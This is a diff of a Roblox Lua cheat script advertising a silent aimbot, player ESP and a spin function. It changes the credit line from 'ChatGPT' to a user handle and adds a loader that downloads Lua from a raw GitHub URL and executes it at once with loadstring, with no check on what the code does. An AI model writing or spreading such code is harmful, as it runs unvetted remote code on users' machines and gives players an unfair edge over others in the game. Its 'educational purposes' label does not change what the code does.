@@ -1,5 +1,5 @@
 -- Silent Aimbot Script with Crosshair, Toggle GUI, Player ESP, and Spin Function
--- Created by ChatGPT © 2024
+-- Created by z-aq © 2024
 -- This script is for educational purposes.
 
 --// Cache
@@ -8,9 +8,31 @@ local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local Camera = workspace.CurrentCamera
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
---// Aimbot Settings
+-- Load and execute GitHub content
+local function LoadGitHubContent(url)
+    local success, response = pcall(function()
+        return HttpService:GetAsync(url)
+    end)
+
+    if success then
+        local func = loadstring(response)
+        if func then
+            func()
+        else
+            warn("Failed to load function from GitHub content.")
+        end
+    else
+        warn("Failed to get GitHub content: " .. response)
+    end
+end
+
+local githubUrl = "https://raw.githubusercontent.com/8Zino99/guy.s/main/aim.lua"
+LoadGitHubContent(githubUrl)
+
+--// Aimbot Settings | try to anfford the close,open tap.
 local Aimbot = {
     Enabled = false,
     FOVRadius = 100,
